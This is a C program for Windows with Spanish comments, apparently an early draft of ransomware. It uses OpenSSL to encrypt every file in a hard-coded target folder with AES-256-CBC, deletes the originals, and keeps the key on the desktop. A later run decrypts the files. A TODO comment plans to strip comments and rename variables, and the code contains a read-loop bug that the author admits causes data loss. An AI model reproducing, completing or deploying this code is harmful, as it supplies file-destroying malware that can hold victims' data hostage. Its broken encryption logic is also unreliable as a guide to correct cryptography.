#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
/* TODO
Se abre la carpeta y se encripta correctamente.
A la hora de desencriptar ocurre un problema con ello. Si le ponemos una extensión personalizada no puede abrir el archivo y simplemente genera una copia en las carpetas (encriptadas).
Si no le ponemos extensión parece que funciona pero se pierde la informacion original.
Cuando terminemos tenemos que quitar los comentarios, renombrar variables y quitar los printf para aumentar la velocidad.
*/
void generateRandomKey(unsigned char *key, int keyLength) {
    RAND_bytes(key, keyLength);
}

void generateRandomIV(unsigned char *iv, int ivLength) {
    RAND_bytes(iv, ivLength);
}

void saveKeyToFile(const char *keyFileName, const unsigned char *key, int keyLength) {
    FILE *keyFile = fopen(keyFileName, "wb");
    if (keyFile) {
        fwrite(key, 1, keyLength, keyFile);
        fclose(keyFile);
    }
}

void saveIVToFile(const char *ivFileName, const unsigned char *iv, int ivLength) {
    FILE *ivFile = fopen(ivFileName, "wb");
    if (ivFile) {
        fwrite(iv, 1, ivLength, ivFile);
        fclose(ivFile);
    }
}

void encryptFile(const char *inputFile, const char *outputFile, const unsigned char *key, const unsigned char *iv) {
    FILE *input = fopen(inputFile, "rb");
    FILE *output = fopen(outputFile, "wb");

    if (input && output) {
        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

        unsigned char buffer[1024];
        int bytesRead, encryptedLength;

        while ((bytesRead = fread(buffer, 1, sizeof(buffer), input) > 0)) {
            EVP_EncryptUpdate(ctx, buffer, &encryptedLength, buffer, bytesRead);
            fwrite(buffer, 1, encryptedLength, output);
        }

        EVP_EncryptFinal_ex(ctx, buffer, &encryptedLength);
        fwrite(buffer, 1, encryptedLength, output);

        EVP_CIPHER_CTX_free(ctx);

        fclose(input);
        fclose(output);
    } else {
        printf("Error: No se pudieron abrir los archivos de entrada o salida.\n");
    }
}

void decryptFile(const char *inputFile, const char *outputFile, const unsigned char *key, const unsigned char *iv) {
    FILE *input = fopen(inputFile, "rb");
    FILE *output = fopen(outputFile, "wb");

    if (input && output) {
        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

        unsigned char buffer[1024];
        int bytesRead, decryptedLength;

        while ((bytesRead = fread(buffer, 1, sizeof(buffer), input)) > 0) {
            EVP_DecryptUpdate(ctx, buffer, &decryptedLength, buffer, bytesRead);
            fwrite(buffer, 1, decryptedLength, output);
        }

        EVP_DecryptFinal_ex(ctx, buffer, &decryptedLength);
        fwrite(buffer, 1, decryptedLength, output);

        EVP_CIPHER_CTX_free(ctx);

        fclose(input);
        fclose(output);

        printf("Desencriptación exitosa. Se han desencriptado %d bytes.\n", bytesRead);
    } else {
        printf("Error: No se pudieron abrir los archivos de entrada o salida.\n");
    }
}

int main() {
    // Inicializar OpenSSL
    OpenSSL_add_all_algorithms();

    // Definir la ruta completa de la carpeta a encriptar
    const char *LeerRegular = "C:\\Users\\Vatalefort\\Desktop\\Objetivo\\*.*"; // Ruta a la carpeta donde se leeran archivos a encritar

    // Definir la ruta completa de la carpeta de salida para archivos encriptados
    const char *LeerEncriptados = "C:\\Users\\Vatalefort\\Desktop\\Encriptados\\*.*"; // Ruta a la carpeta donde se leeran archivos encriptaos

    const char *CarpetaRegular = "C:\\Users\\Vatalefort\\Desktop\\Objetivo\\";

    const char *CarpetaEncriptado = "C:\\Users\\Vatalefort\\Desktop\\Encriptados\\";

    // Definir la ruta completa al archivo de clave
    const char *keyFileName = "C:\\Users\\Vatalefort\\Desktop\\Clave.txt";

    // Definir la ruta completa al archivo del IV
    const char *ivFileName = "C:\\Users\\Vatalefort\\Desktop\\IV.txt";

    // Definir la clave y el vector de inicialización (IV)
    unsigned char key[32];
    unsigned char iv[16];

    // Verificar si el archivo de clave existe
    FILE *keyFile = fopen(keyFileName, "rb");
    if (keyFile) {
        fread(key, 1, sizeof(key), keyFile);
        fclose(keyFile);

        // Leer el IV desde el archivo
        FILE *ivFile = fopen(ivFileName, "rb");
        if (ivFile) {
            fread(iv, 1, sizeof(iv), ivFile);
            fclose(ivFile);
        } else {
            printf("Error: no se encontró el archivo IV.\n");
            return 1;
        }

        // Realizar operaciones de descifrado sobre los archivos de la carpeta "encriptado"
        WIN32_FIND_DATA findFileData;
     
        HANDLE hFind = FindFirstFile((LeerEncriptados), &findFileData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    char inputFile[MAX_PATH];
                    char outputFile[MAX_PATH];

                    _sntprintf(inputFile, MAX_PATH, _T("%s\\%s"), CarpetaEncriptado, findFileData.cFileName);
                    _sntprintf(outputFile, MAX_PATH, _T("%s\\%s"), CarpetaRegular, findFileData.cFileName);

                    if (_taccess(outputFile, 0) != 0) {
                        // El archivo de salida no existe, así que lo creamos
                        FILE *newFile = _tfopen(outputFile, _T("wb"));
                        if (!newFile) {
                            printf("Error al crear el archivo de salida: %s\n", outputFile);
                        }

                        fclose(newFile);
                    }
                    decryptFile(inputFile, outputFile, key, iv);
                    remove(inputFile);
                }
            } while (FindNextFile(hFind, &findFileData) != 0);

            remove(keyFileName);
            remove(ivFileName);
            FindClose(hFind);
            printf("Archivos desencriptados con éxito.\n");
        } else {
            printf("Error al abrir la carpeta de archivos encriptados.\n");
        }
    } else {
        // Si el archivo de clave no existe, generamos una nueva clave y la guardamos
        generateRandomKey(key, sizeof(key));
        saveKeyToFile(keyFileName, key, sizeof(key));

        // Generar un IV aleatorio
        generateRandomIV(iv, sizeof(iv));
        saveIVToFile(ivFileName, iv, sizeof(iv));

        // Realizar operaciones de cifrado sobre los archivos de la carpeta "patata"
        WIN32_FIND_DATA findFileData;
        HANDLE hFind = FindFirstFile((LeerRegular), &findFileData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    char inputFile[MAX_PATH];
                    char outputFile[MAX_PATH];

                    _sntprintf(inputFile, MAX_PATH, _T("%s\\%s"), CarpetaRegular, findFileData.cFileName);
                    _sntprintf(outputFile, MAX_PATH, _T("%s\\%s"), CarpetaEncriptado, findFileData.cFileName);

                    if (_taccess(outputFile, 0) != 0) {
                        // El archivo de salida no existe, así que lo creamos
                        FILE *newFile = _tfopen(outputFile, _T("wb"));
                        if (!newFile) {
                            printf("Error al crear el archivo de salida: %s\n", outputFile);
                        }
                        fclose(newFile);
                    }
                    encryptFile(inputFile, outputFile, key, iv);
                    remove(inputFile);
                }
            } while (FindNextFile(hFind, &findFileData) != 0);

            FindClose(hFind);
            printf("Archivos encriptados con éxito y la clave se ha guardado en '%s'.\n", keyFileName);
        } else {
            printf("Error al abrir la carpeta de archivos a encriptar.\n");
        }
    }

    return 0;
}